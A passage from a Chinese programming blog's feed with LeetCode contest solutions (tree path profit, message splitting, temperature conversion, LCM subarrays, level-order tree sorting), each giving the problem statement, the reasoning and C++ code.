<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>edges.length == n - 1</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt; n</code></li>
<li><code>ai != bi</code></li>
<li><code>edges</code> 表示一棵有效的树。</li>
<li><code>1 &lt;= bob &lt; n</code></li>
<li><code>amount.length == n</code></li>
<li><code>amount[i]</code> 是范围 <code>[-104, 104]</code> 之间的一个 <strong>偶数</strong> 。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-91/problems/most-profitable-path-in-a-tree/">https://leetcode.cn/contest/biweekly-contest-91/problems/most-profitable-path-in-a-tree/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>深度优先搜索
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的深度优先搜索，但是题目比较长需要仔细阅读题目:</li>
</ol>
<ul>
<li><code>alice</code> 从 $0$ 可以到达任意一个叶子节点，即度为 $1$ 的节点。</li>
<li><code>bob</code> 从 $bob$ 可以到达 $0$ 节点；</li>
<li><code>alice</code> 如果到达的节点 <code>bob</code> 已经走过的节点，则得分值不一样。</li>
</ul>
<ol start="2">
<li>从题目中我们可以得知 $bob$ 的路径一定是确定的，且可以知道 $bob$ 途径某个节点 $x$ 的时间为 $time[x]$，因此我们从 $0$ 节点开始依次深度优先搜索到达每个叶子节点，并依次检测路径上的的得分值，找到最小的分值即可。</li>
<li>我们依次为路径上的每个节点设定一个时间为 $step[p]$:</li>
</ol>
<ul>
<li>如果满足 $step[p] &gt; time[p]$，则表示到达当前节点时 $p$ 已经被 <code>bob</code> 访问过；</li>
<li>如果满足 $step[p] &lt; time[p]$，则表示到达当前节点时 $p$ 未被 <code>bob</code> 访问过；</li>
<li>如果满足 $step[p] &#x3D; time[p]$，则表示到达当前节点时 $p$ 同时被 <code>bob</code> 访问；<br>我们依次找到所有的得分值即可。</li>
</ul>
<ol start="4">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为给定的节点的数目。仅需两个 $DFS$ 即可。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为给定的节点的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> curr, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;graph, vector&lt;<span class="type">bool</span>&gt; &amp;visit, vector&lt;<span class="type">int</span>&gt; &amp;path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (curr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : graph[curr]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[v]) <span class="keyword">continue</span>;</span><br><span class="line">            visit[v] = <span class="literal">true</span>;</span><br><span class="line">            path.<span class="built_in">emplace_back</span>(v);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">dfs1</span>(v, graph, visit, path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> curr, <span class="type">int</span> step, <span class="type">int</span> &amp;res, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;graph, vector&lt;<span class="type">bool</span>&gt; &amp;visit, vector&lt;<span class="type">int</span>&gt;&amp; amount, vector&lt;<span class="type">int</span>&gt; &amp;time)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (time[p] == step) &#123;</span><br><span class="line">            curr += amount[p] / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (time[p] &gt; step)&#123;</span><br><span class="line">            curr += amount[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="number">0</span> &amp;&amp; graph[p].<span class="built_in">size</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">            res = <span class="built_in">max</span>(res, curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : graph[p]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[v]) <span class="keyword">continue</span>;</span><br><span class="line">            visit[v] = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">dfs2</span>(v, curr, step + <span class="number">1</span>, res, graph, visit, amount, time);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mostProfitablePath</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> bob, vector&lt;<span class="type">int</span>&gt;&amp; amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = amount.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e : edges) &#123;</span><br><span class="line">            graph[e[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(e[<span class="number">1</span>]);</span><br><span class="line">            graph[e[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(e[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        path.<span class="built_in">emplace_back</span>(bob);</span><br><span class="line">        visit[bob] = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">dfs1</span>(bob, graph, visit, path);</span><br><span class="line">        <span class="type">int</span> res = INT_MIN;</span><br><span class="line">        visit = <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n ,<span class="literal">false</span>);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">time</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; path.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            time[path[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, res, graph, visit, amount, time);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6239-根据限制分割消息"><a href="#6239-根据限制分割消息" class="headerlink" title="6239. 根据限制分割消息"></a>6239. 根据限制分割消息</h3><p>给你一个字符串 <code>message</code> 和一个正整数 <code>limit</code> 。</p>
<p>你需要根据 <code>limit</code> 将 <code>message</code> <strong>分割</strong> 成一个或多个 <strong>部分</strong> 。每个部分的结尾都是 <code>&quot;&lt;a/b&gt;&quot;</code> ，其中 <code>&quot;b&quot;</code> 用分割出来的总数 <strong>替换</strong>， <code>&quot;a&quot;</code> 用当前部分所在的编号 <strong>替换</strong> ，编号从 <code>1</code> 到 <code>b</code> 依次编号。除此以外，除了最后一部分长度 <strong>小于等于</strong> <code>limit</code> 以外，其他每一部分（包括结尾部分）的长度都应该 <strong>等于</strong> <code>limit</code> 。</p>
<p>你需要确保分割后的结果数组，删掉每部分的结尾并 <strong>按顺序</strong> 连起来后，能够得到 <code>message</code> 。同时，结果数组越短越好。</p>
<p>请你返回 <code>message</code> 分割后得到的结果数组。如果无法按要求分割 <code>message</code> ，返回一个空数组。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：message = &quot;this is really a very awesome message&quot;, limit = 9</span><br><span class="line">输出：[&quot;thi&lt;1/14&gt;&quot;,&quot;s i&lt;2/14&gt;&quot;,&quot;s r&lt;3/14&gt;&quot;,&quot;eal&lt;4/14&gt;&quot;,&quot;ly &lt;5/14&gt;&quot;,&quot;a v&lt;6/14&gt;&quot;,&quot;ery&lt;7/14&gt;&quot;,&quot; aw&lt;8/14&gt;&quot;,&quot;eso&lt;9/14&gt;&quot;,&quot;me&lt;10/14&gt;&quot;,&quot; m&lt;11/14&gt;&quot;,&quot;es&lt;12/14&gt;&quot;,&quot;sa&lt;13/14&gt;&quot;,&quot;ge&lt;14/14&gt;&quot;]</span><br><span class="line">解释：</span><br><span class="line">前面 9 个部分分别从 message 中得到 3 个字符。</span><br><span class="line">接下来的 5 个部分分别从 message 中得到 2 个字符。</span><br><span class="line">这个例子中，包含最后一个部分在内，每个部分的长度都为 9 。</span><br><span class="line">可以证明没有办法分割成少于 14 个部分。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：message = &quot;short message&quot;, limit = 15</span><br><span class="line">输出：[&quot;short mess&lt;1/2&gt;&quot;,&quot;age&lt;2/2&gt;&quot;]</span><br><span class="line">解释：</span><br><span class="line">在给定限制下，字符串可以分成两个部分：</span><br><span class="line">- 第一个部分包含 10 个字符，长度为 15 。</span><br><span class="line">- 第二个部分包含 3 个字符，长度为 8 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= message.length &lt;= 104</code></li>
<li><code>message</code> 只包含小写英文字母和 <code>&#39; &#39;</code> 。</li>
<li><code>1 &lt;= limit &lt;= 104</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/height-of-binary-tree-after-subtree-removal-queries/">https://leetcode.cn/problems/height-of-binary-tree-after-subtree-removal-queries/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 数学 + 模拟</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>首先我们假设最少可以切分为 $m$ 块，则可以知道第 $i$ 个部分切分的后缀为 $\text{&#96;&#96;&lt;i&#x2F;m&gt;’’}$，第 $i$ 个部分后缀长度为 $|dec(i)| + |dec(m)| + 3$，其中 $dec(i)$ 表示 $i$ 的十进制的位数。我们知道如下信息:</li>
</ol>
<ul>
<li>$|dec(m)|$ 的长度是固定的；</li>
<li>$|dec(i)|$ 的长度取决于 $i$ 的位数，我们很容易算出。</li>
<li>我们很容易通过数学技巧的手段找到小于等于 $m$ 的数中的 $1,2,3,\cdots$ 位数的个数分别为  $f(1),f(2),f(3),\cdots$，可以在 $O(\log_{10}^{n})$ 的时间复杂度内找到上述数的个数。</li>
<li>所有后缀的数目之和为 $\sum\limits_{i&#x3D;1}^{m}(|dec(i)| + |dec(m)| + 3)$，只需要满足 $\sum\limits_{i&#x3D;1}^{m}(|dec(i)| + |dec(m)| + 3) + n \le limit \times m$，则一定满足填充关系。<br>综上我们依次从小到大尝试 $m$ 的数目即可，找到符合要求的数目即可。</li>
</ul>
<ol start="2">
<li>首先这个题目使用二分法存在问题，我们只需找到反例即可，假设当 $m &#x3D; 99$ 时我们可以满足上述关系，则当 $m &#x3D; 100$ 时则上述不等式不一定成立，我们可以尝试如下:</li>
</ol>
<ul>
<li><p>如果 $m &#x3D; 99$ 此时所有的后缀长度为 $\sum\limits_{i&#x3D;1}^{99}(|dec(i)| + |dec(99)| + 3) &#x3D; 99 \times 5 + 9 + 90 \times 2 &#x3D; 684$；</p>
</li>
<li><p>如果 $m &#x3D; 100$ 此时所有的后缀长度为 $\sum\limits_{i&#x3D;1}^{100}(|dec(i)| + |dec(99)| + 3) &#x3D; 100 \times 6 + 9 + 90 \times 2 + 3 &#x3D; 792$；</p>
</li>
<li><p>我们可以看到实际只增加了后面一个分组但是后缀的总长度增加大概超过了 $100$，我们假设如下不等式成立：<br>$$<br>\begin{align*}<br>\begin{split}<br>\left {<br>\begin{array}{lr}<br>684 + n \le limit \times 99 &amp; \<br>792 + n &gt; limit \times 100 &amp;<br>\end{array}<br>\right.<br>\end{split}<br>\end{align*}<br>$$<br>我们对上述不等式求解，当 $limit + 684 &lt; 792$ 时上述不等式成立，我们可以取 $limit &lt; 108$ 时，上述不等式成立。因此我们可以观察到并不是随着 $m$ 等增大，成立条件并不满足单调性关系，即如果 $m$ 成立满足条件，则 $m + 1$ 一定也成立满足条件。</p>
</li>
</ul>
<ol start="3">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示给定的节点的数目。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示给定的节点的数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> limit, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> tot = m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m &gt;= x) &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(<span class="built_in">pow</span>(<span class="number">10</span>, i) - <span class="built_in">pow</span>(<span class="number">10</span>, i - <span class="number">1</span>));</span><br><span class="line">                tot -= <span class="built_in">pow</span>(<span class="number">10</span>, i) - <span class="built_in">pow</span>(<span class="number">10</span>, i - <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(tot);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            x = x * <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> suffixlen = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">to_string</span>(m).<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            suffixlen += (i + <span class="number">1</span> + <span class="number">3</span> + len) * arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (suffixlen + n &lt;= limit * m) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">splitMessage</span><span class="params">(string message, <span class="type">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = message.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">check</span>(n, limit, i)) &#123;</span><br><span class="line">                m = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">to_string</span>(m).<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">to_string</span>(i).<span class="built_in">size</span>() + x + <span class="number">3</span>;</span><br><span class="line">            <span class="type">int</span> k = limit - len;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(message.<span class="built_in">substr</span>(j, <span class="built_in">min</span>(k, n - j)) + <span class="string">&quot;&lt;&quot;</span> + <span class="built_in">to_string</span>(i) + <span class="string">&quot;/&quot;</span> + <span class="built_in">to_string</span>(m) + <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">            j += k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 319</title>
    <url>/2022/11/25/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/81/</url>
    <content><![CDATA[<h2 id="leetcode-contest-319"><a href="#leetcode-contest-319" class="headerlink" title="leetcode  contest 319"></a>leetcode  contest 319</h2><p>周赛又是手速场的一次，感觉题目都太简单了。</p>
<h3 id="6233-温度转换"><a href="#6233-温度转换" class="headerlink" title="6233. 温度转换"></a>6233. 温度转换</h3><p>给你一个四舍五入到两位小数的非负浮点数 <code>celsius</code> 来表示温度，以 <strong>摄氏度</strong>（<strong>Celsius</strong>）为单位。</p>
<p>你需要将摄氏度转换为 <strong>开氏度</strong>（<strong>Kelvin</strong>）和 <strong>华氏度</strong>（<strong>Fahrenheit</strong>），并以数组 <code>ans = [kelvin, fahrenheit]</code> 的形式返回结果。</p>
<p>返回数组 <em><code>ans</code></em> 。与实际答案误差不超过 <code>10-5</code> 的会视为正确答案<strong>。</strong></p>
<p><strong>注意：</strong></p>
<ul>
<li><code>开氏度 = 摄氏度 + 273.15</code></li>
<li><code>华氏度 = 摄氏度 * 1.80 + 32.00</code></li>
</ul>
<p><strong>示例 1 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：celsius = 36.50</span><br><span class="line">输出：[309.65000,97.70000]</span><br><span class="line">解释：36.50 摄氏度：转换为开氏度是 309.65 ，转换为华氏度是 97.70 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：celsius = 122.11</span><br><span class="line">输出：[395.26000,251.79800]</span><br><span class="line">解释：122.11 摄氏度：转换为开氏度是 395.26 ，转换为华氏度是 251.798 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= celsius &lt;= 1000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-319/problems/convert-the-temperature/">https://leetcode.cn/contest/weekly-contest-319/problems/convert-the-temperature/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接模拟计算温度即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">convertTemperature</span><span class="params">(<span class="type">double</span> celsius)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">res</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">        res[<span class="number">0</span>] = celsius + <span class="number">273.15</span>;</span><br><span class="line">        res[<span class="number">1</span>] = celsius * <span class="number">1.80</span> + <span class="number">32.00</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6234-最小公倍数为-K-的子数组数目"><a href="#6234-最小公倍数为-K-的子数组数目" class="headerlink" title="6234. 最小公倍数为 K 的子数组数目"></a>6234. 最小公倍数为 K 的子数组数目</h3><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> ，请你统计并返回 <code>nums</code> 的 <strong>子数组</strong> 中满足 <em>元素最小公倍数为 <code>k</code></em> 的子数组数目。</p>
<p><strong>子数组</strong> 是数组中一个连续非空的元素序列。</p>
<p><strong>数组的最小公倍数</strong> 是可被所有数组元素整除的最小正整数。</p>
<p><strong>示例 1 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,6,2,7,1], k = 6</span><br><span class="line">输出：4</span><br><span class="line">解释：以 6 为最小公倍数的子数组是：</span><br><span class="line">- [3,6,2,7,1]</span><br><span class="line">- [3,6,2,7,1]</span><br><span class="line">- [3,6,2,7,1]</span><br><span class="line">- [3,6,2,7,1]</span><br></pre></td></tr></table></figure>

<p><strong>示例 2 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3], k = 2</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在以 2 为最小公倍数的子数组。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1000</code></li>
<li><code>1 &lt;= nums[i], k &lt;= 1000</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-319/problems/number-of-subarrays-with-lcm-equal-to-k/">https://leetcode.cn/contest/weekly-contest-319/problems/number-of-subarrays-with-lcm-equal-to-k/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于题目给定的数量很小，所有就非常简单了，直接暴力检测所有可能的子数组，如果满足它们的最小公倍数为 $k$ 则返回即可。</li>
<li>检测时可以进行减枝，如果当前的数不能被 $k$ 整除直接返回即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">subarrayLCM</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = nums[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (k % nums[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    x = x * nums[j] / __gcd(x, nums[j]);</span><br><span class="line">                    <span class="keyword">if</span> (x == k) &#123;</span><br><span class="line">                        ans++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6235-逐层排序二叉树所需的最少操作数目"><a href="#6235-逐层排序二叉树所需的最少操作数目" class="headerlink" title="6235. 逐层排序二叉树所需的最少操作数目"></a>6235. 逐层排序二叉树所需的最少操作数目</h3><p>给你一个 <strong>值互不相同</strong> 的二叉树的根节点 <code>root</code> 。</p>
<p>在一步操作中，你可以选择 <strong>同一层</strong> 上任意两个节点，交换这两个节点的值。</p>
<p>返回每一层按 <strong>严格递增顺序</strong> 排序所需的最少操作数目。</p>
<p>节点的 <strong>层数</strong> 是该节点和根节点之间的路径的边数。</p>
<p><strong>示例 1 ：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/09/18/image-20220918174006-2.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,4,3,7,6,8,5,null,null,null,null,9,null,10]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">- 交换 4 和 3 。第 2 层变为 [3,4] 。</span><br><span class="line">- 交换 7 和 5 。第 3 层变为 [5,6,8,7] 。</span><br><span class="line">- 交换 8 和 7 。第 3 层变为 [5,6,7,8] 。</span><br><span class="line">共计用了 3 步操作，所以返回 3 。</span><br><span class="line">可以证明 3 是需要的最少操作数目。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2 ：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/09/18/image-20220918174026-3.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,3,2,7,6,5,4]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">- 交换 3 和 2 。第 2 层变为 [2,3] 。 </span><br><span class="line">- 交换 7 和 4 。第 3 层变为 [4,6,5,7] 。 </span><br><span class="line">- 交换 6 和 5 。第 3 层变为 [4,5,6,7] 。</span><br><span class="line">共计用了 3 步操作，所以返回 3 。 </span><br><span class="line">可以证明 3 是需要的最少操作数目。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3 ：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/09/18/image-20220918174052-4.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,2,3,4,5,6]</span><br><span class="line">输出：0</span><br><span class="line">解释：每一层已经按递增顺序排序，所以返回 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li>树中节点的数目在范围 <code>[1, 105]</code> 。</li>
<li><code>1 &lt;= Node.val &lt;= 105</code></li>
<li>树中的所有值 <strong>互不相同</strong> 。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-319/problems/minimum-number-of-operations-to-sort-a-binary-tree-by-level/">https://leetcode.cn/contest/weekly-contest-319/problems/minimum-number-of-operations-to-sort-a-binary-tree-by-level/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>树的层次遍历
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于每次交换不涉及到交换子树，只涉及到交换节点值，所以我们直接按照层次遍历，然后求出每层的最小交换次数即可。</li>
<li>求一个数组最小的交换次数为经典问题，即将一个数组变为有序的最少交换次数，可以有两种方法：</li>
</ol>
<ul>
<li>找到图中环的最大数目，在这里由于题目中所有的元素都不相等，所有一个元素只能属于一个环，直接利用 <code>dfs</code> 求出所有的环即可。</li>
<li>贪心策略，直接进行交换即可，直到元素无法完成交换为止，这是由于我们题目中的所有元素均不相等，所以最优的交换策略时唯一的。</li>
<li>可以参考解法：<a href="https://www.geeksforgeeks.org/minimum-number-swaps-required-sort-array/">Minimum number of swaps required to sort an array</a>，如果元素可以重复则情况比较复杂的多。</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \log n)$，$n$ 为给定的节点的数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为给定的节点的数目。</li>
</ul>
